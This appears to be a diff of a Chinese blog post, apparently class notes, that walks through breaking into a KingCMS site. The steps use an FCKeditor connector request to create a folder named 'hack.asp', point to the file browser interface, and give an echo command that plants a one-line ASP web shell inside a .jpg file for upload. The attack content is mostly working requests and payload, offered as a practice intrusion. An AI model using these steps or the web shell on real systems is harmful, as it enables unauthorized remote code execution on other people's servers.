@@ -17,9 +17,11 @@ tags: Hacker
 ##### Step1. 定位漏洞，创建特殊文件夹名，再执行文件解析漏洞得到webshell
 其实这里的难点应该是定位漏洞，不过作为第一次的实战课，老湿侧重让大家体验入侵的过程，省略了定位的过程。   
 
-- 通过漏洞新建一个文件夹`/kingcms/admin/system/editor/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/hack.asp&NewFolderName=hack.asp`
+- 通过漏洞新建一个文件夹`/kingcms/admin/system/editor/FCKeditor/editor/filemanager/connectors/asp/connector.asp?`
+`Command=CreateFolder&Type=Image&CurrentFolder=/hack.asp&NewFolderName=hack.asp`
 - 进入操作界面
-`/kingcms/admin/system/editor/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=../../connectors/asp/connector.asp`
+`/kingcms/admin/system/editor/FCKeditor/editor/filemanager/browser/default/browser.html?`
+`Type=Image&Connector=../../connectors/asp/connector.asp`
 - 制作包含ASP webshell代码的正常后缀名文件, 例如jpg文件
 echo "<%execute(request("MH"))%>" >> jinbin.jpg
 - 上传此文件至刚才新创建的文件夹内
